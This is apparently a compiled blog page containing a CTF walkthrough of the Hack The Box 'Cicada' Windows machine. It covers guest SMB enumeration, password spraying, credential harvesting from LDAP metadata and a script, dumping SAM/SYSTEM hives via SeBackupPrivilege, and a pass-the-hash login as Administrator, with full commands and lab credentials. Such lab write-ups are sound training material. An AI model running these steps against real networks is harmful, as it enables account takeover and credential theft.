"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[8713],{1841:(e,t,s)=>{s.d(t,{A:()=>i});const i=s.p+"assets/images/image-ci-10-04b9627c82ae26b81611fd72b9625a9c.png"},2725:(e,t,s)=>{s.d(t,{A:()=>i});const i=s.p+"assets/images/image-ci-1-7a0f8837bba661162cef6b200f1e3154.png"},3448:(e,t,s)=>{s.d(t,{A:()=>i});const i=s.p+"assets/images/image-ci-11-88a6433161000fe6638bef53c74332ba.png"},3687:(e,t,s)=>{s.d(t,{A:()=>i});const i=s.p+"assets/images/image-ci-3-d2178dfc2751758ad33ea1b8ab1c2ad0.png"},3795:(e,t,s)=>{s.d(t,{A:()=>i});const i=s.p+"assets/images/image-ci-7-c2c4836b59b20798e6ecf167ebf3d68c.png"},5045:(e,t,s)=>{s.r(t),s.d(t,{assets:()=>h,contentTitle:()=>c,default:()=>l,frontMatter:()=>r,metadata:()=>i,toc:()=>d});var i=s(5704),n=s(4848),a=s(8453);const r={title:"Cicada",date:new Date("2025-06-15T00:00:00.000Z"),tags:["easy","windows"]},c=void 0,h={authorsImageUrls:[]},d=[{value:"Task 1",id:"task-1",level:3},{value:"Task 2",id:"task-2",level:3},{value:"Task 3",id:"task-3",level:3},{value:"Task 4",id:"task-4",level:3},{value:"Task 5",id:"task-5",level:3},{value:"Task 6",id:"task-6",level:3},{value:"Task 7",id:"task-7",level:3},{value:"Task 8",id:"task-8",level:3},{value:"Task 9",id:"task-9",level:3},{value:"Task 10",id:"task-10",level:3}];function o(e){const t={code:"code",h3:"h3",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(t.h3,{id:"task-1",children:"Task 1"}),"\n",(0,n.jsx)(t.p,{children:"What is the name of the non-default SMB share that is readable with guest access on Cicada?"}),"\n",(0,n.jsxs)(t.p,{children:["Running ",(0,n.jsx)(t.code,{children:"smbclient -N -L //<target_ip>"})," to connect to the share server without providing a password and list the shares we see two non-default shares named ",(0,n.jsx)(t.code,{children:"DEV"})," and ",(0,n.jsx)(t.code,{children:"HR"}),"."]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(2725).A+"",width:"1546",height:"746"})}),"\n",(0,n.jsxs)(t.p,{children:["Next, to see which one is readable as a guest, we will try to connect to those specific shares. Running ",(0,n.jsx)(t.code,{children:"smbclient -N //<target_ip>/<share_name>"})," we see the one we have access to read is the ",(0,n.jsx)(t.code,{children:"HR"})," share."]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(5374).A+"",width:"1546",height:"708"})}),"\n",(0,n.jsx)(t.h3,{id:"task-2",children:"Task 2"}),"\n",(0,n.jsx)(t.p,{children:"What is the name of the file found in the HR share?"}),"\n",(0,n.jsx)(t.p,{children:'Seen in the previous task, from listing the contents of the HR share, the file name is "Notice from HR.txt".'}),"\n",(0,n.jsx)(t.h3,{id:"task-3",children:"Task 3"}),"\n",(0,n.jsx)(t.p,{children:"Which user account is still using the company default password?"}),"\n",(0,n.jsxs)(t.p,{children:["To see the contents of the file found, we can transfer it to the host by running ",(0,n.jsx)(t.code,{children:'get "Notice from HR'}),'.txt". Opening it, we see a welcoming message to a new hire with the default password but it does not give a username']}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(3687).A+"",width:"1546",height:"506"})}),"\n",(0,n.jsxs)(t.p,{children:["Then, we can try to enumerate domain users on the target IP and save them to a file by running ",(0,n.jsx)(t.code,{children:"lookupsid.py anonymous@<target_ip> > lookupsid_output.txt"}),". Then, we save the usernames cleanly we run ",(0,n.jsx)(t.code,{children:"grep '(SidTypeUser)' lookupsid_output.txt | awk -F '\\\\' '{print $2}' | cut -d' ' -f1 > users.txt"}),".  Finally using the password found in the file, we can perform a password spray attack by running ",(0,n.jsx)(t.code,{children:"netexec smb <target_ip> -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'"})," and find the username to be michael.wrightson."]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(6385).A+"",width:"2286",height:"812"})}),"\n",(0,n.jsx)(t.h3,{id:"task-4",children:"Task 4"}),"\n",(0,n.jsx)(t.p,{children:"Which user has left their password in Active Directory metadata?"}),"\n",(0,n.jsxs)(t.p,{children:["We dump the AD metadata using ",(0,n.jsx)(t.code,{children:"ldapdomaindump -u cicada.htb\\\\michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' <target_ip>"}),". We then try the command ",(0,n.jsx)(t.code,{children:"grep -iE 'pass|key|desc|comment' domain_users.json"})," to look for password in the file matching any lines that contain the mentioned keywords."]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(6218).A+"",width:"1696",height:"808"})}),"\n",(0,n.jsxs)(t.p,{children:["After finding the password we can try to connect with it using the users.txt file from the previous task as ",(0,n.jsx)(t.code,{children:"netexec smb <target_ip> -u users.txt -p 'aRt$Lp#7t*VQ!3'"}),"."]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(3795).A+"",width:"1696",height:"974"})}),"\n",(0,n.jsx)(t.h3,{id:"task-5",children:"Task 5"}),"\n",(0,n.jsx)(t.p,{children:"What is the name of the PowerShell script located in the DEV share?"}),"\n",(0,n.jsxs)(t.p,{children:["Connecting to the DEV share with the credential found in the previous task by running ",(0,n.jsx)(t.code,{children:"smbclient //<target_ip>/DEV -U 'cicada.htb\\\\david.orelious%aRt$Lp#7t*VQ!3'"})," we find the Powershell script after listing the contents."]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(6132).A+"",width:"1696",height:"434"})}),"\n",(0,n.jsx)(t.h3,{id:"task-6",children:"Task 6"}),"\n",(0,n.jsx)(t.p,{children:"What is the emily.oscars user's password?"}),"\n",(0,n.jsxs)(t.p,{children:["We get the file in our host by running ",(0,n.jsx)(t.code,{children:"get Backup_script.ps1"})," and after exiting smb we open the file and locate the user's password."]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(6077).A+"",width:"1696",height:"722"})}),"\n",(0,n.jsx)(t.h3,{id:"task-7",children:"Task 7"}),"\n",(0,n.jsx)(t.p,{children:"Submit the flag located in the emily.oscars user's home directory."}),"\n",(0,n.jsxs)(t.p,{children:["We will try to connect to the default share with the credential found for emily.oscars by running ",(0,n.jsx)(t.code,{children:"smbclient //<target_ip>/C$ -U 'cicada.htb\\\\emily.oscars%Q!3@Lp#M6b*7t*Vt'"}),". We then navigate to here home directory with the relative path ",(0,n.jsx)(t.code,{children:"\\Users\\emily.oscars.CICADA\\DESKTOP\\"})," and run ",(0,n.jsx)(t.code,{children:"get user.txt"})," to get the user flag and open it with ",(0,n.jsx)(t.code,{children:"cat"})," on the host machine."]}),"\n",(0,n.jsx)(t.h3,{id:"task-8",children:"Task 8"}),"\n",(0,n.jsx)(t.p,{children:"What dangerous privilege does the emily.oscar user have associated with their account?"}),"\n",(0,n.jsxs)(t.p,{children:["First we connect with the credentials for the emily user ",(0,n.jsx)(t.code,{children:"evil-winrm -i <host_ip> -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'"}),". Then, we run ",(0,n.jsx)(t.code,{children:"whoami /priv"})," to display the privieges that the user holds on the system and we find that the ",(0,n.jsx)(t.code,{children:"SeBackupPrivilege"})," is enabled for the current user which permits reading any file."]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(1841).A+"",width:"1422",height:"602"})}),"\n",(0,n.jsx)(t.h3,{id:"task-9",children:"Task 9"}),"\n",(0,n.jsx)(t.p,{children:"What is the Administrator user's NTLM hash?"}),"\n",(0,n.jsx)(t.p,{children:"Keeping the evil-winrm session active, we will save the Windows regitstry hives by running the following:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{children:"reg save HKLM\\SAM C:\\Users\\emily.oscars\\Documents\\sam.save\nreg save HKLM\\SYSTEM C:\\Users\\emily.oscars\\Documents\\system.save\n"})}),"\n",(0,n.jsx)(t.p,{children:"We download both files to the local machine by :"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{children:"download sam.save\ndownload system.save\n"})}),"\n",(0,n.jsxs)(t.p,{children:["Then, to extract the NTLM hashes we run ",(0,n.jsx)(t.code,{children:"secretsdump.py -system system.save -sam sam.save LOCAL"}),". This command decrypts the SAM file using the SYSTEM hive and displays local user account hashes. The NTLM hash is the third colon-separated field in the output."]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(3448).A+"",width:"1640",height:"606"})}),"\n",(0,n.jsx)(t.h3,{id:"task-10",children:"Task 10"}),"\n",(0,n.jsx)(t.p,{children:"Submit the flag located on the Administrator user's Desktop."}),"\n",(0,n.jsxs)(t.p,{children:["We can now perrform a Pass-The-Hash attack to impersonate the Administrator using the hash we found in the previous task. Since evil-winfrm supports PtH directly we run ",(0,n.jsx)(t.code,{children:"evil-winrm -i <target_ip> -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341"})," and running ",(0,n.jsx)(t.code,{children:"whoami"}),' we validate we are "cicada\\administrator". Navigating to the Desktop we get the flag by running ',(0,n.jsx)(t.code,{children:"cat root.txt"}),"."]})]})}function l(e={}){const{wrapper:t}={...(0,a.R)(),...e.components};return t?(0,n.jsx)(t,{...e,children:(0,n.jsx)(o,{...e})}):o(e)}},5374:(e,t,s)=>{s.d(t,{A:()=>i});const i=s.p+"assets/images/image-ci-2-eebd0b9bbbfa684c22e86f2ec6e3d7a3.png"},5704:e=>{e.exports=JSON.parse('{"permalink":"/Blog/blog/Cicada","editUrl":"https://github.com/danae-pan/Blog/blog/Cicada.md","source":"@site/blog/Cicada.md","title":"Cicada","description":"Task 1","date":"2025-06-15T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"windows","permalink":"/Blog/blog/tags/windows"}],"readingTime":3.58,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Cicada","date":"2025-06-15T00:00:00.000Z","tags":["easy","windows"]},"unlisted":false,"prevItem":{"title":"Two Million","permalink":"/Blog/blog/TwoMillion"},"nextItem":{"title":"Board Light","permalink":"/Blog/blog/BoardLight"}}')},6077:(e,t,s)=>{s.d(t,{A:()=>i});const i=s.p+"assets/images/image-ci-9-c8a6b549ad4c46725c1feb2397071325.png"},6132:(e,t,s)=>{s.d(t,{A:()=>i});const i=s.p+"assets/images/image-ci-8-b7f78b1d4cdb385d7d9691c780196a30.png"},6218:(e,t,s)=>{s.d(t,{A:()=>i});const i=s.p+"assets/images/image-ci-6-3faaff942dfef3c5779551800503056d.png"},6385:(e,t,s)=>{s.d(t,{A:()=>i});const i=s.p+"assets/images/image-ci-5-c5ee995f367e271c4fee423af0310ef2.png"},8453:(e,t,s)=>{s.d(t,{R:()=>r,x:()=>c});var i=s(6540);const n={},a=i.createContext(n);function r(e){const t=i.useContext(a);return i.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:r(e.components),i.createElement(a.Provider,{value:t},e.children)}}}]);